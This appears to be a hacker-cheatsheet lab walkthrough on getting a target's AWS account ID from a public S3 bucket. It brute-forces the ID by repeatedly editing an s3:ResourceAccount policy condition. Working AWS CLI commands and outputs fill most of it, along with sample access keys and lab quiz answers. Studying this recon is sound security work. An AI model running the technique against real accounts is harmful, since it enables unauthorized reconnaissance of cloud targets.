# Obtaining Account IDs from S3 Buckets

Getting AccountID from a Public S3 Bucket or Object
>![](https://raw.githubusercontent.com/caderob/hacker-cheatsheet/main/Images/Obtaining-Account-IDs-from-S3-Buckets-1.gif)

Getting the Name of the Public Bucket with curl
>``` shell
>kali@kali:~$ curl -s www.offseclab.io | grep -o -P 'offseclab-assets-public-\w{8}'
>
># ========== Expected Result ==========
>offseclab-assets-public-kaykoour
>offseclab-assets-public-kaykoour
>offseclab-assets-public-kaykoour
>offseclab-assets-public-kaykoour
># =====================================
>```

Listing the Public Bucket as the attacker
>``` shell
>kali@kali:~$ aws --profile attacker s3 ls offseclab-assets-public-kaykoour
>
># ========== Expected Result ==========
>                           PRE sites/
># =====================================
>```

Creating the IAM User "enum" and Generating AccessKeyId and SecretAccessKey for that User
>``` shell
>kali@kali:~$ aws --profile attacker iam create-user --user-name enum
>
># ========== Expected Result ==========
>{
>    "User": {
>        "Path": "/",
>        "UserName": "enum",
>        "UserId": "AIDAQOMAIGYU4HTPEJ32K",
>        "Arn": "arn:aws:iam::123456789012:user/enum",
>    }
>}
># =====================================
>
>kali@kali:~$ aws --profile attacker iam create-access-key --user-name enum
>
># ========== Expected Result ==========
>{
>    "AccessKey": {
>        "UserName": "enum",
>        "AccessKeyId": "AKIAQOMAIGYURE7QCUXU",
>        "Status": "Active",
>        "SecretAccessKey": "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",
>    }
>}
># =====================================
>```

Configuring AWS CLI with Profile "enum"
>``` shell
>kali@kali:~$ aws configure --profile enum
>
># ========== Expected Result ==========
>AWS Access Key ID [None]: AKIAQOMAIGYURE7QCUXU
>AWS Secret Access Key [None]: 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
>Default region name [None]: us-east-1
>Default output format [None]: json
># =====================================
>
>kali@kali:~$ aws sts get-caller-identity --profile enum
>
># ========== Expected Result ==========
>{
>    "UserId": "AIDAQOMAIGYU4HTPEJ32K",
>    "Account": "123456789012",
>    "Arn": "arn:aws:iam::123456789012:user/enum"
>}
># =====================================
>```

Getting AccountID from a Public S3 Bucket or Object. Lab Modification
>![](https://raw.githubusercontent.com/caderob/hacker-cheatsheet/main/Images/Obtaining-Account-IDs-from-S3-Buckets-2.png)

Listing the Private Bucket with the enum User
>``` shell
>kali@kali:~$ aws --profile enum s3 ls offseclab-assets-private-kaykoour
>
># ========== Expected Result ==========
>An error occurred (AccessDenied) when calling the ListObjectsV2 operation: Access Denied  
># =====================================
>```

Policy to Allow Listing Buckets and Reading Objects
>``` shell
># policy-s3-read.json
>{
>     "Version": "2012-10-17",
>    "Statement": [
>        {
>            "Sid": "AllowResourceAccount",
>            "Effect": "Allow",
>            "Action": [
>                "s3:ListBucket",
>                "s3:GetObject"
>            ],
>            "Resource": "*",
>            "Condition": {
>                "StringLike": {"s3:ResourceAccount": ["0*"]}
>            }
>        }
>    ]
>}
>```

Creating the policy document file
>``` shell
>kali@kali:~$ nano policy-s3-read.json
>
>kali@kali:~$ cat -n policy-s3-read.json 
>
># ========== Expected Result ==========
>     1  {
>     2      "Version": "2012-10-17",
>     3      "Statement": [
>     4          {
>     5              "Sid": "AllowResourceAccount",
>     6              "Effect": "Allow",
>     7              "Action": [
>     8                  "s3:ListBucket",
>     9                  "s3:GetObject"
>    10              ],
>    11              "Resource": "*",
>    12              "Condition": {
>    13                  "StringLike": {"s3:ResourceAccount": ["0*"]}
>    14              }
>    15          }
>    16      ]
>    17  } 
># =====================================
>```

Attaching the s3-read Inline Policy to the enum IAM User
>``` shell
>kali@kali:~$ aws --profile attacker iam put-user-policy \
>--user-name enum \
>--policy-name s3-read \
>--policy-document file://policy-s3-read.json
>
>kali@kali:~$ aws --profile attacker iam list-user-policies --user-name enum
>
># ========== Expected Result ==========
>{
>    "PolicyNames": [
>        "s3-read"
>    ]
>}
># =====================================
>```

Changing the Condition in the Policy and Testing Again
>``` shell
>kali@kali:~$ aws --profile enum s3 ls offseclab-assets-private-kaykoour
>
># ========== Expected Result ==========
>An error occurred (AccessDenied) when calling the ListObjectsV2 operation: Access Denied  
># =====================================
>
>kali@kali:~$ nano policy-s3-read.json
>
>kali@kali:~$ cat -n policy-s3-read.json 
>
># ========== Expected Result ==========
>     1  {
>     2      "Version": "2012-10-17",
>     3      "Statement": [
>     4          {
>     5              "Sid": "AllowResourceAccount",
>     6              "Effect": "Allow",
>     7              "Action": [
>     8                  "s3:ListBucket",
>     9                  "s3:GetObject"
>    10              ],
>    11              "Resource": "*",
>    12              "Condition": {
>    13                  "StringLike": {"s3:ResourceAccount": ["1*"]}
>    14              }
>    15          }
>    16      ]
>    17  }
># =====================================
>
>kali@kali:~$ aws --profile attacker iam put-user-policy \
>--user-name enum \
>--policy-name s3-read \
>--policy-document file://policy-s3-read.json
>
>kali@kali:~$ aws --profile enum s3 ls offseclab-assets-private-kaykoour
>
># ========== Expected Result ==========
>                           PRE sites/
># =====================================
>```

Modifying the Policy Condition Statement to Brute Force the AccountID
>``` shell
>kali@kali:~$ aws --profile enum s3 ls offseclab-assets-private-kaykoour
>
># ========== Expected Result ==========
>- __"StringLike": {"s3:ResourceAccount": ["10*"]}__
>- __"StringLike": {"s3:ResourceAccount": ["11*"]}__
>...
>- __"StringLike": {"s3:ResourceAccount": ["18*"]}__
>- __"StringLike": {"s3:ResourceAccount": ["19*"]}__
># =====================================
>```

Lab 1 - What is the main objective of the technique described in the text?
>B) To obtain the target's AWS account ID from a publicly-shared S3 bucket or object.

Lab 2 - How is the publicly readable bucket name initially obtained?
>C) By retrieving it from the URL of any image on the website using the curl command.

Lab 3 - What AWS CLI command is used to list the contents of a bucket?
>C) aws s3 ls
